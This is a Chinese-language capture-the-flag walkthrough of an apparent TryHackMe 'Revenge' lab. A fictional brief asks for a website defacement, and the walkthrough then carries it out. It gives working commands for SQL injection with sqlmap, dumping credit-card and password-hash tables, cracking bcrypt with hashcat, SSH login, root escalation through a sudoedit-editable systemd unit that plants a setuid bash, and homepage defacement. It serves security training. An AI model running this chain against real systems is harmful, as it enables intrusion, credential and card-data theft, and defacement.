# Revenge

可能涉及的人，

我知道是你黑了我的博客。 你的技能给我留下了深刻的印象。 你有点马虎
并留下了一点足迹，所以我能够找到你。 但是，谢谢你接受我的提议。 
我已经对网站进行了一些初步的枚举，因为我知道\*一些*关于黑客的事情，但还不够。 
出于这个原因，我将让你做自己的枚举和检查。

我要你做的很简单。 闯入运行网站的服务器并污损首页。 
我不在乎你怎么做，只要做就行了。 但请记住...不要关闭网站！ 我们不想造成无法弥补的损害。

完成工作后，您将获得剩余的付款。 我们商定了5 000美元。 
一半在前面，一半在你完成后。

祝你好运

比利

---

    ┌──(root🐦kali)-[/home/sugobet]
    └─# nmap -sS 10.10.103.200
    Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-10 20:19 CST
    Nmap scan report for 10.10.103.200
    Host is up (0.26s latency).
    Not shown: 998 closed tcp ports (reset)
    PORT   STATE SERVICE
    22/tcp open  ssh
    80/tcp open  http

进入web查看，发现一处可能存在sqli, poc：

    http://10.10.103.200/products/1+1

数字型注入，成功返回另一个存在的页面

上sqlmap，省时省力

    sqlmap -u 'http://10.10.103.200/products/1' --dbs

    [20:29:17] [INFO] the back-end DBMS is MySQL
    web server operating system: Linux Ubuntu
    web application technology: Nginx 1.14.0
    back-end DBMS: MySQL >= 5.0.12
    [20:29:19] [INFO] fetching database names
    available databases [5]:
    [*] duckyinc
    [*] information_schema
    [*] mysql
    [*] performance_schema
    [*] sys

查duckyinc所有表：

    sqlmap -u 'http://10.10.103.200/products/1' --dbms=mysql -D duckyinc --tables

    Database: duckyinc
    [3 tables]
    +-------------+
    | system_user |
    | user        |
    | product     |
    +-------------+

爆列并且转储数据：

    sqlmap -u 'http://10.10.103.200/products/1' --dbms=mysql -D duckyinc -T user -C credit_card --dump

这样将能够获得第一个flag，至于该表的数据，我们暂且放下，因为我们有另一个更值得看的表system_user

这表名一听就跟目标系统用户会有关系

    sqlmap -u 'http://10.10.103.200/products/1' --dbms=mysql -D duckyinc -T system_user -C username,_password --dump

    Database: duckyinc
    Table: system_user
    [3 entries]
    +--------------+--------------------------------------------------------------+
    | username     | _password                                                    |
    +--------------+--------------------------------------------------------------+
    | server-admin | $2a$08$GPh7KZcK2kNIQEm5byBj1umCQ79xP.zQe19hPoG/w2GoebUtPfT8a |
    | kmotley      | $2a$12$LEENY/LWOfyxyCBUlfX8Mu8viV9mGUse97L8x.4L66e9xwzzHfsQa |
    | dhughes      | $2a$12$22xS/uDxuIsPqrRcxtVmi.GR2/xh0xITGdHuubRF4Iilg5ENAFlcK |
    +--------------+--------------------------------------------------------------+

数据存储在：

    /root/.local/share/sqlmap/output/10.10.103.200/dump/duckyinc/system_user.csv

使用haiti-hash可以帮助我们快速识别hash类型，还能告诉我们hashcat和john的类型值：

    ┌──(root🐦kali)-[/home/sugobet]
    └─# haiti '$2a$08$GPh7KZcK2kNIQEm5byBj1umCQ79xP.zQe19hPoG/w2GoebUtPfT8a'
    bcrypt [HC: 3200] [JtR: bcrypt]
    Blowfish(OpenBSD) [HC: 3200] [JtR: bcrypt]
    Woltlab Burning Board 4.x

hashcat 的hash-mode值是：3200

清洗数据，提取hash：

    cut -d ":" -f2 /root/.local/share/sqlmap/output/10.10.103.200/dump/duckyinc/system_user.csv > ./test1.txt

爆破：

    hashcat -a 0 -m 3200 ./test1.txt /usr/share/wordlists/rockyou.txt

    $2a$08$GPh7KZcK2kNIQEm5byBj1umCQ79xP.zQe19hPoG/w2GoebUtPfT8a:in*****ha

只爆出了server-admin的密码，但那也足够了，现在登录ssh

    ┌──(root🐦kali)-[/home/sugobet]
    └─# ssh server-admin@10.10.103.200

成功

    server-admin@duckyinc:~$ ls -la
    total 44
    drwxr-xr-x 5 server-admin server-admin 4096 Aug 12  2020 .
    drwxr-xr-x 3 root         root         4096 Aug 10  2020 ..
    lrwxrwxrwx 1 root         root            9 Aug 10  2020 .bash_history -> /dev/null
    -rw-r--r-- 1 server-admin server-admin  220 Aug 10  2020 .bash_logout
    -rw-r--r-- 1 server-admin server-admin 3771 Aug 10  2020 .bashrc
    drwx------ 2 server-admin server-admin 4096 Aug 10  2020 .cache
    -rw-r----- 1 server-admin server-admin   18 Aug 10  2020 flag2.txt
    drwx------ 3 server-admin server-admin 4096 Aug 10  2020 .gnupg
    -rw------- 1 root         root           31 Aug 10  2020 .lesshst
    drwxr-xr-x 3 server-admin server-admin 4096 Aug 10  2020 .local
    -rw-r--r-- 1 server-admin server-admin  807 Aug 10  2020 .profile
    -rw-r--r-- 1 server-admin server-admin    0 Aug 10  2020 .sudo_as_admin_successful
    -rw------- 1 server-admin server-admin 2933 Aug 12  2020 .viminfo
    server-admin@duckyinc:~$ cat ./flag2.txt

查看sudo -l:

    Matching Defaults entries for server-admin on duckyinc:
        env_reset, mail_badpass,
        secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

    User server-admin may run the following commands on duckyinc:
        (root) /bin/systemctl start duckyinc.service, /bin/systemctl enable duckyinc.service,
            /bin/systemctl restart duckyinc.service, /bin/systemctl daemon-reload, sudoedit
            /etc/systemd/system/duckyinc.service

有个sudoedit，直接使用：

    sudoedit /etc/systemd/system/duckyinc.service

是nano

编辑该文件：

    [Unit]
    Description=Gunicorn instance to serve DuckyInc Webapp
    After=network.target

    [Service]
    User=root
    Group=root
    WorkingDirectory=/var/www/duckyinc
    ExecStart=/bin/bash /tmp/hack.sh
    ExecReload=/bin/kill -s HUP $MAINPID
    ExecStop=/bin/kill -s TERM $MAINPID

    [Install]
    WantedBy=multi-user.target

创建文件/tmp/hack.sh:

    #!/bin/bash

    cp /bin/bash /tmp/bash
    chmod +s /tmp/bash

重载配置并重启服务

    server-admin@duckyinc:~$ sudo /bin/systemctl daemon-reload
    server-admin@duckyinc:~$ sudo /bin/systemctl restart duckyinc.service

/tmp/bash

    server-admin@duckyinc:~$ /tmp/bash -p
    bash-4.4# whoami
    root

但是/root下并没有flag,即便使用find也找不到

查看提示：任务目标

    我要你做的很简单。 闯入运行网站的服务器并污损首页。

将duckyinc.service文件的group和user恢复原样

然后修改/var/www/duckyinc/templates/index.html

flag就会出现在/root
